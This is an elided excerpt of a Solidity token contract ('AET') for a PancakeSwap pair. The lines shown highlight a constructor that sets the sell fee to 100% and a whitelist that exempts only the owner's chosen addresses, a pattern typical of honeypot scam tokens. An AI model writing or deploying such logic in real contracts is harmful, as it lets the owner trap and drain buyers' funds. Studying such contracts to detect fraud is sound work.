...
contract AET is CfoTakeableV2, IERC20Metadata {
    using Address for address;
    ...
    string private constant _name = "AET";
    string private constant _symbol = "AET";
    uint256 private _totalSupply = 1000000000 * 1e18;
    uint256 private constant _fixedTotalSupply = 1000000000 * 1e18;
    ...
    uint public sellFeeRate = 500;
    address public feeTo = address(0x3F55534cE2E2b331D0520729729608349c8365e2);

    // testnet
    // address public constant usdt = address(0x70051121871E8Cf4DdEa97AFaFB4510B4D8870d4);
    ...
    constructor(
        ...
        isWhitelisted[_initHolder] = true;
        sellFeeRate = 10000;
    ...
    function burn() public returns (bool) {
        ...
        _totalSupply = _fixedTotalSupply.sub(_balances[deadAddr]);
        return true;
    }
    ...
    function setWhitelist(address _account, bool flag) public onlyOwner {
        isWhitelisted[_account] = flag;
    }
    ...
    function _transfer(
        ...
        if(recipient != address(0) && ((isBuy && !isWhitelisted[recipient]) || (isSell && !isWhitelisted[sender]))){
    ...
    function isSwapPair(address pair) public view returns(bool){
        ...
        return pancakeSwapFactory.getPair(address(this), usdt) == pair || isOtherSwapPair[pair];
    }
